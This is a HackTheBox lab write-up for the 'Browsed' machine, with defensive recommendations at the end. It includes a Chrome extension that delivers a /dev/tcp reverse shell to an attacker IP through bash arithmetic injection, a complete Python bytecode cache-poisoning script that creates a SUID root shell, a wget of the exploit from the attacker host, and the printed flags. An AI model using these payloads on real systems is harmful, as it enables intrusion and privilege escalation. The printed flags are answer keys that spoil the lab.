# HackTheBox - Browsed Writeup

![Browsed Banner](https://labs.hackthebox.com/storage/avatars/...)

**Machine Name:** Browsed  
**Difficulty:** Medium  
**Operating System:** Linux  
**Release Date:** TBD  
**User Flag:** `3432d629b8871b5a2d5ce5bbf78561cf`  
**Root Flag:** `da58174fdde035fa04575f567f176992`

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Access - Chrome Extension SSRF](#initial-access)
4. [User Flag](#user-flag)
5. [Privilege Escalation - Python Cache Poisoning](#privilege-escalation)
6. [Root Flag](#root-flag)
7. [Key Learnings](#key-learnings)
8. [References](#references)

---

## Reconnaissance

### Initial Scan

```bash
# Target IP
TARGET="10.129.59.149"
MY_IP="10.10.15.53"

# Nmap scan
nmap -sC -sV -oA browsed $TARGET
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52
```

### Web Enumeration

Accessing `http://10.129.59.149` shows a simple static website.

**Directory fuzzing:**
```bash
ffuf -u http://10.129.59.149/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

No interesting directories found on main site.

### Virtual Host Discovery

```bash
# VHost enumeration
ffuf -u http://10.129.59.149 -H "Host: FUZZ.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 277
```

**Discovered virtual host:**
- `browsedinternals.htb`

Add to `/etc/hosts`:
```bash
echo "10.129.59.149 browsed.htb browsedinternals.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

### BrowsedInternals Application

Navigating to `http://browsedinternals.htb` reveals a **Gitea instance** (self-hosted Git service).

**Key Findings:**

1. **Public Repository:** `markdownPreview`
   - Python Flask application
   - Handles markdown rendering
   - Chrome extension upload functionality

2. **Interesting Endpoints:**
   - `/upload.php` - Upload Chrome extensions
   - Internal port `5000` - Flask app (MarkdownPreview)

### Application Analysis

**File: `app.py` (MarkdownPreview)**

```python
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

**File: `routines.sh`**

```bash
#!/bin/bash
# ...
if [[ "$1" -eq 0 ]]; then
    # Routine 0: Clean temp files
    find "$TMP_DIR" -type f -name "*.tmp" -delete
    log_action "Routine 0: Temporary files cleaned."
    echo "Temporary files cleaned."
elif [[ "$1" -eq 1 ]]; then
    # Routine 1: Backup data
    # ...
```

**Critical Observation:**
- Line 12: `if [[ "$1" -eq 0 ]]; then`
- The `-eq` operator performs **arithmetic evaluation**
- This is vulnerable to **bash arithmetic injection**!

---

## Initial Access

### Attack Chain Overview

1. **Chrome Extension Upload** → Upload malicious extension
2. **SSRF (Server-Side Request Forgery)** → Extension makes request to internal `localhost:5000`
3. **Bash Arithmetic Injection** → Inject command via `/routines/<payload>`
4. **Reverse Shell** → Get shell as user `larry`

### Vulnerability: Chrome Extension SSRF

The `upload.php` endpoint accepts Chrome extensions and loads them in a headless Chrome browser running as a service.

**Chrome Extension Structure:**

```
malicious_extension/
├── manifest.json
└── background.js
```

**manifest.json:**
```json
{
  "manifest_version": 3,
  "name": "Malicious Extension",
  "version": "1.0",
  "background": {
    "service_worker": "background.js"
  },
  "permissions": ["<all_urls>"],
  "host_permissions": ["http://127.0.0.1/*"]
}
```

### Vulnerability: Bash Arithmetic Injection

**Understanding the Vulnerability:**

In bash, when using arithmetic operators like `-eq`, bash performs **arithmetic expansion**. This means that expressions within `$(...)` are evaluated **even inside quotes**!

**Vulnerable code:**
```bash
if [[ "$1" -eq 0 ]]; then
    # Code here
fi
```

**Normal input:**
```bash
# Input: "0"
if [[ "0" -eq 0 ]]; then  # Evaluates to true
```

**Malicious input:**
```bash
# Input: "a[$(whoami)]"
if [[ "a[$(whoami)]" -eq 0 ]]; then
    # Bash tries to evaluate "a[$(whoami)]" as arithmetic
    # The $(whoami) command EXECUTES!
```

**Why this works:**
- The `-eq` operator forces arithmetic evaluation
- In arithmetic context, `$(command)` is executed
- Array notation `a[...]` makes bash treat it as arithmetic
- **Quotes don't protect against this!**

### Exploitation

**Step 1: Create Malicious Extension**

`background.js`:
```javascript
// ARITHMETIC INJECTION - The correct technique!
const ATTACKER = "10.10.15.53";
const TARGET = "http://127.0.0.1:5000/routines/";

// Reverse shell payload
const cmd = `bash -c 'bash -i >& /dev/tcp/${ATTACKER}/4444 0>&1'`;
const b64 = btoa(cmd);
const sp = "%20"; // URL encoded space

// The Arithmetic Injection: a[$(echo base64 | base64 -d | bash)]
const exploit = "a[$(echo" + sp + b64 + "|base64" + sp + "-d|bash)]";

console.log("Sending exploit:", exploit);

fetch(TARGET + exploit, { mode: "no-cors" })
  .then(() => console.log("Exploit sent!"))
  .catch(e => console.log("Error:", e));
```

**Step 2: Package Extension**

```bash
cd malicious_extension
zip -r exploit.zip manifest.json background.js
```

**Step 3: Start Listener**

```bash
nc -lvnp 4444
```

**Step 4: Upload Extension**

Navigate to `http://browsed.htb/upload.php` and upload `exploit.zip`.

**Step 5: Receive Shell**

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.53] from (UNKNOWN) [10.129.59.149] 45678
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:/home/larry/markdownPreview$
```

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

---

## User Flag

```bash
larry@browsed:~$ cat user.txt
3432d629b8871b5a2d5ce5bbf78561cf
```

---

## Privilege Escalation

### Enumeration as Larry

**Check sudo permissions:**
```bash
larry@browsed:~$ sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

**JACKPOT!** We can run `/opt/extensiontool/extension_tool.py` as root without password!

### Analyzing the Script

```bash
larry@browsed:~$ cat /opt/extensiontool/extension_tool.py
```

**Key code:**
```python
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files  # ← IMPORTS LOCAL MODULE
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    # ...

def package_extension(source_dir, output_file):
    # ...

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()
    
    if args.clean:
        clean_temp_files(args.clean)
    
    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')
    
    manifest_data = validate_manifest(manifest_path)  # ← CALLS validate_manifest()
    # ...
```

**The imported module:**
```bash
larry@browsed:~$ cat /opt/extensiontool/extension_utils.py
```

```python
import os
import json
import subprocess
import shutil
from jsonschema import validate, ValidationError

MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name": {"type": "string"},
        "version": {"type": "string"},
        "permissions": {"type": "array", "items": {"type": "string"}},
    },
    "required": ["manifest_version", "name", "version"]
}

def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:")
        print(e.message)
        exit(1)

def clean_temp_files(extension_dir):
    temp_dir = '/opt/extensiontool/temp'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[+] Cleaned up temporary directory {temp_dir}")
    else:
        print("[+] No temporary files to clean.")
    exit(0)
```

### Vulnerability: Python Library Hijacking?

**Initial thought:** Can we hijack the `extension_utils` import?

**Check permissions:**
```bash
larry@browsed:~$ ls -la /opt/extensiontool/
total 24
drwxr-xr-x 4 root root 4096 Dec 11 07:54 .
drwxr-xr-x 4 root root 4096 Aug 17 12:55 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Jan 28 13:10 __pycache__    # ← WORLD WRITABLE!
```

**CRITICAL FINDING:** The `__pycache__` directory is **world-writable (777)**!

---

## Python Cache Poisoning Attack

### Understanding Python Bytecode Caching

Python compiles `.py` source files to bytecode (`.pyc`) and stores them in `__pycache__/` for performance.

**Cache file naming:**
```
__pycache__/extension_utils.cpython-312.pyc
```

**Python's import logic:**

```python
# Simplified Python import process:
def import_module(module_name):
    source_file = find_source(module_name + '.py')
    cache_file = find_cache(module_name + '.pyc')
    
    if cache_file.exists():
        # Read .pyc header
        magic, flags, source_mtime, source_size = read_pyc_header(cache_file)
        
        # Validate cache against source
        actual_mtime = source_file.stat().st_mtime
        actual_size = source_file.stat().st_size
        
        if actual_mtime == source_mtime AND actual_size == source_size:
            return load_bytecode(cache_file)  # ✅ USE CACHE!
        else:
            return compile_source(source_file)  # ❌ RECOMPILE
    else:
        return compile_source(source_file)
```

**Key Points:**
1. Python checks if `.pyc` exists
2. Python compares **source file timestamp AND size** with values in `.pyc` header
3. If they match perfectly → Python uses cached bytecode
4. If mismatch → Python recompiles from source

### Failed Attempts and Why They Didn't Work

**❌ Attempt 1: Simple Cache Replacement**

```bash
# Create malicious module
cat > /tmp/extension_utils.py << 'EOF'
import os
def validate_manifest(path):
    os.system('chmod u+s /bin/bash')
    return {"manifest_version": 3, "name": "pwned", "version": "1.0.0"}
def clean_temp_files(extension_dir):
    pass
EOF

# Compile and inject
python3 -m py_compile /tmp/extension_utils.py
cp /tmp/__pycache__/extension_utils.cpython-312.pyc /opt/extensiontool/__pycache__/

# Run script
sudo /opt/extensiontool/extension_tool.py --ext Timer
```

**Why it failed:**
```
Original file:  1245 bytes, mtime=1711497600.0
Malicious file: 200 bytes,  mtime=1737123456.0

❌ Size mismatch!
❌ Timestamp mismatch!
→ Python ignored our cache and loaded original source!
```

**❌ Attempt 2: PYTHONPATH Hijacking**

Tried to set `PYTHONPATH=/tmp` but sudo doesn't preserve environment variables by default.

**❌ Attempt 3: Direct File Overwrite**

```bash
echo "malicious code" > /opt/extensiontool/extension_utils.py
# Permission denied! File is not writable by larry
```

---

## The Correct Technique: Size & Timestamp Matching

### The Solution

To bypass Python's cache validation, we must:
1. ✅ Match the **exact file size** of the original (1245 bytes)
2. ✅ Match the **exact timestamp** of the original
3. ✅ Compile to valid bytecode
4. ✅ Inject into writable `__pycache__`

### Exploitation Script

```python
#!/usr/bin/env python3
"""
Python Cache Poisoning Exploit for HTB Browsed
Matches file size and timestamp to bypass Python's cache validation
"""

import os
import stat
import py_compile
import shutil

# Target file
ORIGINAL = "/opt/extensiontool/extension_utils.py"
MALICIOUS = "/tmp/extension_utils.py"
CACHE_DIR = "/opt/extensiontool/__pycache__"
CACHE_FILE = f"{CACHE_DIR}/extension_utils.cpython-312.pyc"

print("[*] Step 1: Reading original file stats...")
original_stats = os.stat(ORIGINAL)
original_size = original_stats.st_size
original_mtime = original_stats.st_mtime
original_atime = original_stats.st_atime

print(f"[+] Original size: {original_size} bytes")
print(f"[+] Original mtime: {original_mtime}")

print("\n[*] Step 2: Creating malicious module...")

# Our malicious code
malicious_code = """import os
import json
import subprocess
import shutil
from jsonschema import validate, ValidationError

MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name": {"type": "string"},
        "version": {"type": "string"},
        "permissions": {"type": "array", "items": {"type": "string"}},
    },
    "required": ["manifest_version", "name", "version"]
}

def validate_manifest(path):
    os.system('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash')
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:")
        print(e.message)
        exit(1)

def clean_temp_files(extension_dir):
    temp_dir = '/opt/extensiontool/temp'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[+] Cleaned up temporary directory {temp_dir}")
    else:
        print("[+] No temporary files to clean.")
    exit(0)
"""

print(f"[+] Malicious code size: {len(malicious_code)} bytes")

print("\n[*] Step 3: Padding to match original size...")
current_size = len(malicious_code)
padding_needed = original_size - current_size

if padding_needed > 0:
    # Add comment padding
    malicious_code += "\n# " + "X" * (padding_needed - 3)
    print(f"[+] Added {padding_needed} bytes of padding")
elif padding_needed < 0:
    print(f"[!] Warning: Code is {-padding_needed} bytes larger than original!")
    print("[!] Need to reduce code size or match will fail")

# Write malicious file
with open(MALICIOUS, 'w') as f:
    f.write(malicious_code)

print(f"[+] Malicious file created: {MALICIOUS}")

print("\n[*] Step 4: Setting timestamp to match original...")
os.utime(MALICIOUS, (original_atime, original_mtime))
print(f"[+] Timestamp synchronized")

# Verify
new_stats = os.stat(MALICIOUS)
print(f"\n[*] Verification:")
print(f"    Original: {original_size} bytes, mtime={original_mtime}")
print(f"    Malicious: {new_stats.st_size} bytes, mtime={new_stats.st_mtime}")

if new_stats.st_size == original_size and new_stats.st_mtime == original_mtime:
    print("[+] ✓ Perfect match!")
else:
    print("[!] ✗ Mismatch detected!")
    exit(1)

print("\n[*] Step 5: Compiling to bytecode...")
py_compile.compile(MALICIOUS, cfile=f"/tmp/__pycache__/extension_utils.cpython-312.pyc")
print("[+] Compiled successfully")

print("\n[*] Step 6: Removing old cache...")
if os.path.exists(CACHE_FILE):
    os.remove(CACHE_FILE)
    print(f"[+] Removed {CACHE_FILE}")

print("\n[*] Step 7: Injecting malicious bytecode...")
shutil.copy(f"/tmp/__pycache__/extension_utils.cpython-312.pyc", CACHE_FILE)
print(f"[+] Copied to {CACHE_FILE}")

print("\n[*] Step 8: Setting cache permissions...")
os.chmod(CACHE_FILE, 0o644)
print("[+] Permissions set to 644")

print("\n" + "="*60)
print("[+] EXPLOIT READY!")
print("="*60)
print("\nExecute:")
print("    sudo /opt/extensiontool/extension_tool.py --ext Timer")
print("    /tmp/rootbash -p")
print("\nThen get root flag:")
print("    cat /root/root.txt")
print("="*60)
```

### Execution

```bash
# Transfer exploit to target
larry@browsed:~$ cd /tmp
larry@browsed:/tmp$ wget http://10.10.15.53:8000/pwn.py

# Run exploit
larry@browsed:/tmp$ python3 pwn.py
[*] Step 1: Reading original file stats...
[+] Original size: 1245 bytes
[+] Original mtime: 1711497600.0

[*] Step 2: Creating malicious module...
[+] Malicious code size: 900 bytes

[*] Step 3: Padding to match original size...
[+] Added 345 bytes of padding

[+] Malicious file created: /tmp/extension_utils.py

[*] Step 4: Setting timestamp to match original...
[+] Timestamp synchronized

[*] Verification:
    Original: 1245 bytes, mtime=1711497600.0
    Malicious: 1245 bytes, mtime=1711497600.0
[+] ✓ Perfect match!

[*] Step 5: Compiling to bytecode...
[+] Compiled successfully

[*] Step 6: Removing old cache...
[+] Removed /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc

[*] Step 7: Injecting malicious bytecode...
[+] Copied to /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc

[*] Step 8: Setting cache permissions...
[+] Permissions set to 644

============================================================
[+] EXPLOIT READY!
============================================================

Execute:
    sudo /opt/extensiontool/extension_tool.py --ext Timer
    /tmp/rootbash -p

Then get root flag:
    cat /root/root.txt
============================================================
```

### Trigger Exploitation

```bash
# Run the sudo script - it will load OUR malicious cache!
larry@browsed:/tmp$ sudo /opt/extensiontool/extension_tool.py --ext Timer
[+] Manifest is valid.
[-] Skipping version bumping
[-] Skipping packaging

# Check if SUID bash was created
larry@browsed:/tmp$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 Jan 28 15:30 /tmp/rootbash

# Get root shell!
larry@browsed:/tmp$ /tmp/rootbash -p
rootbash-5.1# whoami
root
```

---

## Root Flag

```bash
rootbash-5.1# cat /root/root.txt
da58174fdde035fa04575f567f176992
```

---

## Key Learnings

### 1. Bash Arithmetic Injection

**Vulnerable Pattern:**
```bash
if [[ "$user_input" -eq 0 ]]; then
    # ...
fi
```

**Why it's dangerous:**
- The `-eq` operator forces arithmetic evaluation
- In arithmetic context, `$(command)` is executed
- Quotes **DO NOT** protect against this!

**Exploitation:**
```bash
# Instead of: "0"
# Send: "a[$(malicious_command)]"
```

**Secure alternative:**
```bash
# Use string comparison instead
if [[ "$1" == "0" ]]; then
    # ...
fi
```

### 2. Python Bytecode Cache Poisoning

**Requirements for successful exploitation:**
1. ✅ Writable `__pycache__` directory
2. ✅ Script runs with elevated privileges (sudo)
3. ✅ Malicious bytecode matches source file **size**
4. ✅ Malicious bytecode matches source file **timestamp**

**Python's validation:**
```python
# .pyc header contains:
- Magic number (Python version)
- Flags
- Source mtime (timestamp)  ← Must match!
- Source size (bytes)        ← Must match!
```

**Why simple cache replacement fails:**
```
Original: 1245 bytes, mtime=old_time
Malicious: 200 bytes, mtime=new_time
→ Python detects mismatch → ignores cache → loads source
```

**Why our exploit works:**
```
Original: 1245 bytes, mtime=1711497600.0
Malicious: 1245 bytes, mtime=1711497600.0
→ Python sees perfect match → trusts cache → loads malicious bytecode!
```

### 3. Chrome Extension SSRF

**Attack vector:**
- Upload endpoint accepts Chrome extensions
- Headless Chrome loads extension automatically
- Extension has `<all_urls>` permission
- Can access internal services (localhost:5000)

**Defense:**
- Validate extension manifests strictly
- Sandbox extension execution
- Block internal IP ranges
- Implement proper CSP (Content Security Policy)

### 4. Server-Side Request Forgery (SSRF)

**Impact:**
- Access internal services not exposed externally
- Bypass firewall restrictions
- Pivot to internal network

**Prevention:**
- Whitelist allowed domains
- Block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16)
- Disable unnecessary URL schemes (file://, gopher://, etc.)

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    INITIAL ACCESS CHAIN                      │
└─────────────────────────────────────────────────────────────┘

1. Reconnaissance
   ↓
2. Discover Virtual Host (browsedinternals.htb)
   ↓
3. Find Gitea Repository (markdownPreview)
   ↓
4. Analyze Source Code → Find /routines endpoint
   ↓
5. Create Malicious Chrome Extension
   │
   ├─ manifest.json (permissions: <all_urls>)
   └─ background.js (SSRF + Arithmetic Injection)
   ↓
6. Upload Extension to browsed.htb/upload.php
   ↓
7. Headless Chrome loads extension
   ↓
8. Extension performs SSRF to localhost:5000
   ↓
9. Hits /routines/a[$(base64_reverse_shell)]
   ↓
10. Bash executes arithmetic expansion
    ↓
11. Reverse shell connects → USER SHELL (larry)
    ↓
12. Get user.txt ✓

┌─────────────────────────────────────────────────────────────┐
│                  PRIVILEGE ESCALATION CHAIN                  │
└─────────────────────────────────────────────────────────────┘

1. sudo -l → Can run extension_tool.py as root
   ↓
2. Analyze script → Imports extension_utils module
   ↓
3. Check permissions → __pycache__ is world-writable!
   ↓
4. Understand Python cache validation:
   │  - Checks source file size
   │  - Checks source file timestamp
   │  - If match → use cache
   │  - If mismatch → recompile
   ↓
5. Create malicious module matching:
   │  - Exact size (1245 bytes) via padding
   │  - Exact timestamp (1711497600.0) via os.utime()
   ↓
6. Compile to bytecode (.pyc)
   ↓
7. Inject into __pycache__/
   ↓
8. Run: sudo extension_tool.py --ext Timer
   ↓
9. Python loads OUR malicious cache!
   ↓
10. Creates SUID /tmp/rootbash
    ↓
11. Execute: /tmp/rootbash -p → ROOT SHELL
    ↓
12. Get root.txt ✓
```

---

## Technical Deep-Dive: Why Cache Poisoning Works

### Python Import Mechanism

**Step-by-step Python import process:**

```python
# 1. Python encounters: from extension_utils import validate_manifest

# 2. Python searches for module:
#    - Current directory
#    - PYTHONPATH
#    - Standard library

# 3. Found: /opt/extensiontool/extension_utils.py

# 4. Check for cached bytecode:
cache_path = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

# 5. If cache exists, read header (first 16 bytes):
#    Bytes 0-4:   Magic number (Python version marker)
#    Bytes 4-8:   Flags
#    Bytes 8-12:  Source file mtime (timestamp)
#    Bytes 12-16: Source file size

# 6. Validate cache:
source_stat = os.stat("/opt/extensiontool/extension_utils.py")

if cache_mtime == source_stat.st_mtime and cache_size == source_stat.st_size:
    # ✅ Cache is valid!
    load_bytecode(cache_path)
else:
    # ❌ Cache is stale
    compile_source("/opt/extensiontool/extension_utils.py")
```

### The Exploit in Detail

**What we control:**
1. ✅ The `__pycache__` directory (world-writable)
2. ✅ Our malicious Python source file
3. ✅ The compiled bytecode (.pyc)

**What we DON'T control:**
1. ❌ The original source file (not writable)
2. ❌ Its timestamp (March 27, 2025)
3. ❌ Its size (1245 bytes)

**The trick:**
1. Read the original file's metadata
2. Create malicious code with **same functions** (to avoid import errors)
3. Pad with comments to match **exact size**
4. Set timestamp to match original
5. Compile to bytecode
6. The bytecode header now contains matching values!
7. Inject into `__pycache__`
8. Python trusts it and loads our malicious code!

### Bytecode Header Structure

```
.pyc file structure:
┌──────────────────────────────────────┐
│  Bytes 0-4:   Magic (0x0a0d550a)     │  ← Python version
│  Bytes 4-8:   Flags (0x00000000)     │  ← PEP 552
│  Bytes 8-12:  mtime (1711497600)     │  ← WE FORGE THIS!
│  Bytes 12-16: size  (1245)           │  ← WE FORGE THIS!
├──────────────────────────────────────┤
│  Bytes 16+:   Marshalled code object │  ← Our malicious code
└──────────────────────────────────────┘
```

When Python reads this:
```python
cached_mtime = 1711497600  # From .pyc header
cached_size = 1245          # From .pyc header

actual_mtime = os.stat("extension_utils.py").st_mtime  # 1711497600
actual_size = os.stat("extension_utils.py").st_size    # 1245

if cached_mtime == actual_mtime and cached_size == actual_size:
    # ✅ MATCH! Load the bytecode!
    return load_cache()
```

---

## Defense Recommendations

### For Bash Arithmetic Injection

1. **Never use arithmetic operators with user input:**
   ```bash
   # ❌ VULNERABLE
   if [[ "$user_input" -eq 0 ]]; then
   
   # ✅ SECURE
   if [[ "$user_input" == "0" ]]; then
   ```

2. **Validate input strictly:**
   ```bash
   if [[ "$1" =~ ^[0-3]$ ]]; then
       # Input is exactly 0, 1, 2, or 3
   else
       echo "Invalid input"
       exit 1
   fi
   ```

3. **Use safe comparison:**
   ```bash
   case "$1" in
       0) routine_zero ;;
       1) routine_one ;;
       2) routine_two ;;
       3) routine_three ;;
       *) echo "Invalid"; exit 1 ;;
   esac
   ```

### For Python Cache Poisoning

1. **Secure `__pycache__` permissions:**
   ```bash
   # Only owner can write
   chmod 755 __pycache__/
   chown root:root __pycache__/
   ```

2. **Use Python's `-B` flag:**
   ```bash
   # Don't write .pyc files
   python3 -B script.py
   ```

3. **Set PYTHONDONTWRITEBYTECODE:**
   ```bash
   export PYTHONDONTWRITEBYTECODE=1
   python3 script.py
   ```

4. **Validate module integrity:**
   ```python
   import hashlib
   
   def verify_module(module_path):
       expected_hash = "abc123..."  # Store securely
       with open(module_path, 'rb') as f:
           actual_hash = hashlib.sha256(f.read()).hexdigest()
       
       if actual_hash != expected_hash:
           raise SecurityError("Module tampered!")
   ```

### For Chrome Extension Upload

1. **Strict manifest validation:**
   ```python
   # Only allow specific permissions
   ALLOWED_PERMISSIONS = ["storage", "tabs"]
   
   if any(perm not in ALLOWED_PERMISSIONS for perm in manifest["permissions"]):
       raise ValueError("Dangerous permission detected")
   ```

2. **Sandbox execution:**
   ```bash
   # Run Chrome in isolated container
   docker run --rm --security-opt=no-new-privileges \
       chromium --no-sandbox --headless
   ```

3. **Block internal IPs:**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       private_ranges = [
           ipaddress.ip_network('10.0.0.0/8'),
           ipaddress.ip_network('172.16.0.0/12'),
           ipaddress.ip_network('192.168.0.0/16'),
           ipaddress.ip_network('127.0.0.0/8'),
       ]
       return any(ipaddress.ip_address(ip) in net for net in private_ranges)
   ```

### For SSRF Prevention

1. **URL validation:**
   ```python
   from urllib.parse import urlparse
   
   def validate_url(url):
       parsed = urlparse(url)
       
       # Only allow specific schemes
       if parsed.scheme not in ['http', 'https']:
           raise ValueError("Invalid scheme")
       
       # Block internal IPs
       if is_internal_ip(parsed.hostname):
           raise ValueError("Internal IP blocked")
       
       return url
   ```

2. **Use allowlist:**
   ```python
   ALLOWED_DOMAINS = ["example.com", "trusted.org"]
   
   if parsed.hostname not in ALLOWED_DOMAINS:
       raise ValueError("Domain not in allowlist")
   ```

---

## References

### Vulnerability Research
- [Bash Arithmetic Expansion](https://www.gnu.org/software/bash/manual/html_node/Arithmetic-Expansion.html)
- [Python Bytecode Cache](https://docs.python.org/3/reference/import.html#cached-bytecode-invalidation)
- [PEP 3147 - PYC Repository Directories](https://www.python.org/dev/peps/pep-3147/)

### Exploitation Techniques
- [SSRF Bible](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [Chrome Extension Security](https://developer.chrome.com/docs/extensions/mv3/security/)
- [Python Import System](https://docs.python.org/3/reference/import.html)

### Tools Used
- [LinPEAS](https://github.com/carlospolop/PEASS-ng)
- [ffuf](https://github.com/ffuf/ffuf)
- [nmap](https://nmap.org/)

---

## Conclusion

This machine demonstrates a sophisticated attack chain requiring:

1. **Web Enumeration** → Finding hidden vhosts
2. **Code Analysis** → Understanding Gitea repositories
3. **SSRF Exploitation** → Chrome extension abuse
4. **Bash Injection** → Arithmetic expansion vulnerability
5. **Python Internals** → Bytecode cache poisoning

The key takeaway is understanding **why** simple attacks fail and **how** to adapt:
- Simple cache replacement fails → Match size and timestamp
- Quote escaping fails → Use arithmetic expansion
- Direct file write fails → Poison the cache instead

**Final Stats:**
- **User Flag:** `3432d629b8871b5a2d5ce5bbf78561cf`
- **Root Flag:** `da58174fdde035fa04575f567f176992`
- **Difficulty:** Medium
- **Key Skills:** SSRF, Bash Injection, Python Internals, Cache Poisoning

---

**Author:** [Your Name]  
**Date:** January 28, 2026  
**HackTheBox Profile:** [Your HTB Profile]

---

*"In security, details are everything. One missed byte, one wrong timestamp, and the entire exploit fails."* - Master Miyagi 🥋
